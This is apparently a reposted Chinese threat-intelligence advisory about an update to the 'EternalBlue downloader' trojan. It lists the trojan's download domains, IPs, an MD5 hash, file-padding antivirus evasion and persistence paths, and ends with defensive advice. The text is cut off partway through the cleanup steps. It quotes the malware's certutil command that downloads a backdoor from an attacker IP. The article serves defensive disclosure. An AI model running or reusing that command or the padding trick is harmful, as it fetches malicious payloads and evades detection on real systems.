# 永恒之蓝下载器木马再更新：增肥木马程序逃避查杀

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI5ODk3OTM1Ng==&mid=2247489128&idx=2&sn=15ece0502c585c0613b8e1685c406822&chksm=ec9ccf1bdbeb460d856269fd41d40fca273a4fb2f62bc4e65b2e88ab1cbdedf26de5b70fd5ae&scene=126&sessionid=1681278557#rd](http://mp.weixin.qq.com/s?__biz=MzI5ODk3OTM1Ng==&mid=2247489128&idx=2&sn=15ece0502c585c0613b8e1685c406822&chksm=ec9ccf1bdbeb460d856269fd41d40fca273a4fb2f62bc4e65b2e88ab1cbdedf26de5b70fd5ae&scene=126&sessionid=1681278557#rd)

**背景**  
腾讯御见威胁情报中心3月13日监测到永恒之蓝下载器木马再次出现异动，本次木马更新攻击模块ii.dat的下载地址，并修改了部分代码(未改动之前使用的攻击方式)，同时下载后门程序mn.dat，将其填充大量垃圾数据生成超大文件（增肥后的木马程序在50MB左右）进行躲避查杀。增肥后的大文件木马被拷贝到多个系统目录并通过注册表启动项、开始菜单启动项、计划任务添加为开机自启动。

  

**更新攻击模块下载地址**

域名：v.y6h.net  
IP: 139.162.73.241  
URL:hxxp:// v.y6h.net/ii.dat  
Md5: 21e49843502325b063b4d52e8c297f79  
  
感染机器上的Powershell计划任务下载攻击模块ii.dat，保存为C:\\Windows\\Temp\\sartpg.exe执行。将核心代码解压后与3月8日更新文件对比，发现有一处恶意代码下载地址hxxp://info.haqo.net/e.png?id=被更换为hxxp://info.ackng.com/e.png?id=  

![](../Images/dccc8a2dde466aa00e0fc21dbc5a413c.png)

  

**新增“大文件”后门**  
感染机器上的计划任务后通过以下命令下载新的后门程序mn.dat:  
certutil  -urlcache -split -f hxxp://153.92.4.49/mn.dat C:/Windows/system32/config/systemprofile/AppData/Roaming/abc.exe  
  
文件签名：“Shenzhen Qitu Software Technolgy Co., Ltd. ”  

![](../Images/10855e55314537e05ba8f506ed0b3fb0.png)

  

文件执行后拷贝自身到多个系统目录，生成随机名文件，在文件尾部写入大量无用信息，增肥文件大小以躲避杀软查杀。  
C:/Windows/Xubfl2Ps.exe  
C:/Users/admin/AppData/Roaming/NHaWAm04.exe  
C:/Users/admin/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/aEQ9s3k9.exe

**安全建议**  
1.服务器暂时关闭不必要的端口（如135、139、445），方法可参考：https://guanjia.qq.com/web\_clinic/s8/585.html   
  
2.服务器使用高强度密码，切勿使用弱口令，防止黑客暴力破解；   
  
3.使用杀毒软件拦截可能的病毒攻击；   
  
4.推荐企业用户部署腾讯御界高级威胁检测系统防御可能的黑客攻击。御界高级威胁检测系统，是基于腾讯安全反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。  

![](../Images/c303288ce50cf1a8e53fa939aaad015c.png)

  

5\. 中毒电脑除可使用腾讯电脑管家、腾讯御点终端防御系统查杀病毒，也可参考以下提示手动清理：
